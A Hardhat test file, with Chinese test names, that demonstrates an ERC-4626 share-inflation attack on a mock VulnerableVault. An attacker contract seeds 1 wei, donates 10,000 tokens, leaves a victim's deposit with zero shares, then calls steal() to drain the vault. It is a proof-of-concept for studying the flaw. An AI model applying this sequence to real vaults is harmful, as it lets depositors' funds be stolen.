const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("ERC-4626 通胀攻击", function () {
  const DONATION = ethers.parseEther("10000");
  const VICTIM_DEPOSIT = ethers.parseEther("9999");
  const SEED = 1n;

  async function deployFixture() {
    const [deployer, attacker, victim] = await ethers.getSigners();
    const MockUSDC = await ethers.getContractFactory("MockUSDC");
    const VulnerableVault = await ethers.getContractFactory("VulnerableVault");
    const InflationAttacker = await ethers.getContractFactory("InflationAttacker");

    const usdc = await MockUSDC.deploy();
    const vault = await VulnerableVault.deploy(await usdc.getAddress());
    const attackerContract = await InflationAttacker.deploy(await vault.getAddress());

    await usdc.mint(attacker.address, DONATION + VICTIM_DEPOSIT + ethers.parseEther("100"));
    await usdc.mint(victim.address, VICTIM_DEPOSIT);

    return { deployer, attacker, victim, usdc, vault, attackerContract };
  }

  it("受害者 0 份额、攻击者获利", async function () {
    const { attacker, victim, usdc, vault, attackerContract } = await deployFixture();

    await usdc.connect(attacker).approve(await attackerContract.getAddress(), DONATION + SEED);
    await attackerContract.connect(attacker).setup(SEED, DONATION);

    await usdc.connect(victim).approve(await vault.getAddress(), VICTIM_DEPOSIT);
    await vault.connect(victim).deposit(VICTIM_DEPOSIT, victim.address);

    expect(await vault.balanceOf(victim.address)).to.equal(0);

    const before = await usdc.balanceOf(attacker.address);
    await attackerContract.connect(attacker).steal();
    const after = await usdc.balanceOf(attacker.address);

    expect(after).to.be.gt(before);
    expect(await vault.balanceOf(victim.address)).to.equal(0);
    expect(await usdc.balanceOf(await vault.getAddress())).to.be.lt(ethers.parseEther("1"));
  });
});
